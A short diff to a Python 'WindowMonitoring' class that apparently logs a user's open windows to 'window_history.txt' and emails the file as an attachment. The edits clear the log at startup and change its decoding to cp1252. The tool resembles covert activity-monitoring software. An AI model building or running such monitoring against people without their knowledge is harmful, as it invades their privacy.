@@ -12,6 +12,9 @@ class WindowMonitoring:
         self.last_windows = set()  # Initialize as an empty set
         self.history_length = 0
         self.email_interval = 30 
+        with open('window_history.txt', 'w') as f:
+            f.write('')
+            
         while True:
             self.check_open_windows()
             time.sleep(5)
@@ -53,7 +56,7 @@ class WindowMonitoring:
 
         # Attach the text file
         with open(attachment_path, 'rb') as f:
-            attachment = MIMEText(f.read().decode('utf-8'))
+            attachment = MIMEText(f.read().decode('cp1252'))
             attachment.add_header('Content-Disposition', 'attachment', filename=attachment_path)
             msg.attach(attachment)
 
